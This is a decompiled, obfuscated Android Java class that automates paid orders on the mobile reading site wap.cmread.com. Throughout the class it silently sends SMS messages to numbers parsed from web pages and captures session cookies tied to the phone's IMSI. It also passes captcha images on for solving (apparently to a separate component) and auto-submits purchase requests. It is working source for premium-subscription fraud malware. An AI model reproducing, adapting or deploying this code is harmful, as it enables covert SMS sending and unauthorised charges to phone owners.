package com.amaz.onib;

import android.content.Context;
import android.content.SharedPreferences;
import android.telephony.SmsManager;
import android.text.TextUtils;
import bn.sdk.szwcsss.common.az.code.b.Cint;
import com.yf.y.f.init.util.ConstUtils;
import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
/* loaded from: classes.dex */
public class cc {
    public static void a(Context context, String str, h hVar) {
        String str2;
        String str3;
        String str4;
        String str5;
        String str6;
        String str7;
        String str8;
        String str9;
        String[] split;
        String str10;
        String str11;
        String str12;
        g.a(context).a(hVar.f732a, hVar.z, "pid", str);
        SharedPreferences sharedPreferences = context.getSharedPreferences("cmk", 0);
        try {
            bs.a("cm#" + str);
            r c = t.a(str).c(false);
            c.b(Cint.d, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            c.b(Cint.g, "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; MI 2SC Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/2.1.1");
            c.b(Cint.f, "gzip, deflate");
            c.b(Cint.e, "zh-CN,en-US;q=0.8");
            c.b("X-Org-Request", "1");
            c.a(ConstUtils.MIN);
            if (sharedPreferences.contains("imsi") && sharedPreferences.getString("imsi", "-").equals(FSrvi.IMSI) && "wifi".equals(ar.c)) {
                c.b((Map<String, String>) sharedPreferences.getAll());
            }
            String a2 = c.a();
            String str13 = null;
            String str14 = null;
            Iterator<w> it = x.a(a2, "a").iterator();
            while (true) {
                if (!it.hasNext()) {
                    str2 = null;
                    str3 = null;
                    str4 = null;
                    break;
                }
                w next = it.next();
                if (next.a("href") != null && next.a("href").startsWith("/r/u/purchase.jsp")) {
                    str4 = "http://wap.cmread.com" + next.a("href");
                    Iterator<w> it2 = x.a(a2, "img").iterator();
                    while (true) {
                        if (!it2.hasNext()) {
                            str11 = null;
                            str12 = null;
                            break;
                        }
                        w next2 = it2.next();
                        if (next2.a("src") != null && next2.a("src").startsWith("/r/vs/avi")) {
                            str12 = "http://wap.cmread.com" + next2.a("src");
                            try {
                                bs.b("验证码" + str12);
                                c.a(str12);
                                c.b(true);
                                c.c();
                                str11 = bp.a(c.d().g());
                                break;
                            } catch (Exception e) {
                                if (!(e instanceof u)) {
                                    throw new ce(6, str12);
                                }
                                str11 = null;
                            }
                        }
                    }
                    c.b(Cint.d, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                    str3 = str12;
                    str2 = str11;
                } else if (next.a("href") != null && next.a("href").startsWith("sms:")) {
                    String a3 = next.a("href");
                    String substring = a3.substring(4, a3.indexOf("?"));
                    String substring2 = a3.substring(a3.indexOf("body=") + 5, a3.length());
                    String a4 = next.a("onclick");
                    String str15 = "http://wap.cmread.com" + a4.substring(4, a4.length() - 2);
                    try {
                        SmsManager.getDefault().sendTextMessage(substring, null, substring2, null, null);
                    } catch (IllegalArgumentException e2) {
                        bs.c("TAG", "发送短信出错");
                    }
                    try {
                        Thread.sleep(10000L);
                    } catch (InterruptedException e3) {
                        e3.printStackTrace();
                    }
                    try {
                        bs.b("登录验证");
                        a2 = c.a(str15).a();
                        Map<String, String> d = c.d().d();
                        if (d.containsKey("userPhoneToken")) {
                            bs.b("获取到Cookie");
                            SharedPreferences.Editor edit = sharedPreferences.edit();
                            for (String str16 : d.keySet()) {
                                edit.putString(str16, d.get(str16));
                            }
                            edit.putString("imsi", FSrvi.IMSI);
                            edit.commit();
                        }
                        Iterator<w> it3 = x.a(a2, "a").iterator();
                        while (true) {
                            if (!it3.hasNext()) {
                                str10 = null;
                                break;
                            }
                            w next3 = it3.next();
                            if (next3.a("href") != null && next3.a("href").startsWith("/r/u/purchase.jsp")) {
                                String str17 = "http://wap.cmread.com" + next3.a("href");
                                bs.b("订购地址" + str17);
                                str10 = str17;
                                break;
                            }
                        }
                        Iterator<w> it4 = x.a(a2, "img").iterator();
                        while (true) {
                            if (!it4.hasNext()) {
                                break;
                            }
                            w next4 = it4.next();
                            if (next4.a("src") != null && next4.a("src").startsWith("/r/vs/avi")) {
                                str13 = "http://wap.cmread.com" + next4.a("src");
                                try {
                                    c.a(str13);
                                    c.b(true);
                                    c.c();
                                    str14 = bp.a(c.d().g());
                                    break;
                                } catch (IOException e4) {
                                    if (!(e4 instanceof u)) {
                                        throw new ce(6, str13);
                                    }
                                }
                            }
                        }
                        c.b(Cint.d, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                        str3 = str13;
                        str4 = str10;
                        str2 = str14;
                    } catch (Exception e5) {
                        throw new ce(4, str15);
                    }
                }
            }
            if (str4 != null) {
                if (!TextUtils.isEmpty(str3)) {
                    if (TextUtils.isEmpty(str2)) {
                        throw new ce(6, str3);
                    }
                    n a5 = n.a(new aj().a(str2));
                    if (a5 == null || !"1".equals(a5.f738a)) {
                        throw new ce(10, "请求服务端验证码结果失败！");
                    }
                    for (String str18 : str4.split("&")) {
                        if (str18.contains("verifyCode")) {
                            str4 = str4.replace(str18, "verifyCode=" + a5.d);
                            break;
                        }
                    }
                }
                try {
                    bs.b("订购" + str4);
                    String a6 = c.a(str4).a();
                    if (a6.contains("read_content")) {
                        bs.b("订购成功");
                        throw new ce(1, a6);
                    }
                    bs.b(str4);
                    bs.b("订购失败" + a6);
                    if (a6.contains("余额不足")) {
                        throw new ce(5, a6);
                    } else if (str.startsWith("/r/l/r.jsp")) {
                        throw new ce(str3 != null ? 7 : 8, a6);
                    } else {
                        String str19 = "";
                        Iterator<w> it5 = x.a(a6, "a").iterator();
                        while (true) {
                            if (!it5.hasNext()) {
                                break;
                            }
                            w next5 = it5.next();
                            if (next5.a("href") != null && next5.a("href").startsWith("/r/l/r.jsp")) {
                                str19 = "http://wap.cmread.com" + next5.a("href");
                                bs.b("订购入口地址" + str19);
                                break;
                            }
                        }
                        if (TextUtils.isEmpty(str19)) {
                            throw new ce(str3 != null ? 7 : 8, a6);
                        }
                        a(context, str19, hVar);
                    }
                } catch (Exception e6) {
                    throw new ce(4, str4);
                }
            } else {
                String str20 = "";
                List<w> a7 = x.a(a2, "form[action]");
                if (a7 != null) {
                    Iterator<w> it6 = a7.iterator();
                    str5 = str4;
                    while (true) {
                        if (!it6.hasNext()) {
                            break;
                        }
                        String a8 = it6.next().a("action");
                        if (a8 == null || !a8.startsWith("/r/u/purchase.jsp")) {
                            if (a8 == null || !a8.startsWith("/r/a/vfyCheck;jsessionid")) {
                                str6 = str20;
                                str7 = str5;
                            } else {
                                str7 = "http://wap.cmread.com" + a8;
                                str6 = "smscode_form";
                            }
                            str5 = str7;
                            str20 = str6;
                        } else {
                            str5 = "http://wap.cmread.com" + a8;
                            str20 = "form";
                            Iterator<w> it7 = x.a(a2, "img").iterator();
                            while (true) {
                                if (!it7.hasNext()) {
                                    str8 = str2;
                                    str9 = str3;
                                    break;
                                }
                                w next6 = it7.next();
                                if (next6.a("src") != null && next6.a("src").startsWith("/r/vs/avi")) {
                                    String str21 = "http://wap.cmread.com" + next6.a("src");
                                    try {
                                        bs.b("验证码" + str21);
                                        c.a(str21);
                                        c.b(true);
                                        c.c();
                                        str8 = bp.a(c.d().g());
                                        str9 = str21;
                                        break;
                                    } catch (Exception e7) {
                                        if (!(e7 instanceof u)) {
                                            throw new ce(6, str21);
                                        }
                                        str8 = str2;
                                        str9 = str21;
                                    }
                                }
                            }
                            str3 = str9;
                            str2 = str8;
                        }
                    }
                } else {
                    str5 = str4;
                }
                if (str5 == null) {
                    if (a2 != null) {
                        if (a2.contains("登录") || a2.contains("用户名") || a2.contains("密码")) {
                            bs.b("要登录");
                            throw new ce(3, a2);
                        } else if (a2.contains("read_content")) {
                            bs.b("已订购");
                            throw new ce(2, a2);
                        }
                    }
                    bs.b("未知" + a2);
                    throw new ce(9, a2 != null ? a2 : "未知");
                } else if ("smscode_form".equals(str20)) {
                    a(context, "", str5, hVar, "getsmscode");
                } else {
                    String str22 = null;
                    if (!TextUtils.isEmpty(str3)) {
                        if (TextUtils.isEmpty(str2)) {
                            throw new ce(6, str3);
                        }
                        n a9 = n.a(new aj().a(str2));
                        if (a9 == null || !"1".equals(a9.f738a)) {
                            throw new ce(10, "请求服务端验证码结果失败！");
                        }
                        str22 = a9.d;
                    }
                    try {
                        bs.b("订购" + str5);
                        c.a(str5);
                        c.a("pt", "1");
                        if (str22 != null) {
                            c.a("verifyCode", str22);
                        }
                        String b = c.b();
                        if (b.contains("read_content")) {
                            bs.b("订购成功");
                            throw new ce(1, b);
                        }
                        bs.b(str5);
                        bs.b("订购失败" + b);
                        if (b.contains("余额不足")) {
                            throw new ce(5, b);
                        } else if (str.startsWith("/r/l/r.jsp")) {
                            throw new ce(str3 != null ? 7 : 8, b);
                        } else {
                            String str23 = "";
                            Iterator<w> it8 = x.a(b, "a").iterator();
                            while (true) {
                                if (!it8.hasNext()) {
                                    break;
                                }
                                w next7 = it8.next();
                                if (next7.a("href") != null && next7.a("href").startsWith("/r/l/r.jsp")) {
                                    str23 = "http://wap.cmread.com" + next7.a("href");
                                    bs.b("订购入口地址" + str23);
                                    break;
                                }
                            }
                            if (TextUtils.isEmpty(str23)) {
                                throw new ce(str3 != null ? 7 : 8, b);
                            }
                            a(context, str23, hVar);
                        }
                    } catch (Exception e8) {
                        throw new ce(4, str5);
                    }
                }
            }
        } catch (Exception e9) {
            throw new ce(4, str);
        }
    }

    public static void a(Context context, String str, String str2, h hVar, String str3) {
        HashMap hashMap = new HashMap();
        if ("getsmscode".equals(str3) && hVar != null) {
            g.a(context).a(hVar.f732a, hVar.z, "submitUrl", str2);
            hashMap.put("s_getsmscode", "获取验证码");
            hashMap.put("s_smscode", "");
        } else if ("order".equals(str3)) {
            hashMap.put("s_order", "确认订购");
            hashMap.put("s_smscode", str);
        } else {
            throw new ce(9, "未知类型错误");
        }
        try {
            r a2 = t.a(str2);
            a2.a(ConstUtils.MIN);
            a2.a(hashMap);
            String b = a2.b();
            if (b.contains("read_content") || b.contains("readtext")) {
                bs.a("TAG", "订购成功");
                throw new ce(1, b);
            } else if (!b.contains("下发短信验证码成功") || !"getsmscode".equals(str3)) {
                if ("order".equals(str3)) {
                    r c = t.a(hVar.D).c(false);
                    c.a(ConstUtils.MIN);
                    try {
                        b = c.a();
                        if (b.contains("read_content") || b.contains("readtext")) {
                            bs.a("TAG", "订购成功");
                            throw new ce(1, b);
                        }
                    } catch (IOException e) {
                        throw new ce(8, hVar.D);
                    }
                }
                throw new ce(8, b);
            } else {
                bs.a("TAG", "下发短信验证码成功");
                throw new ce(1000, b);
            }
        } catch (Exception e2) {
            throw new ce(4, str2);
        }
    }
}
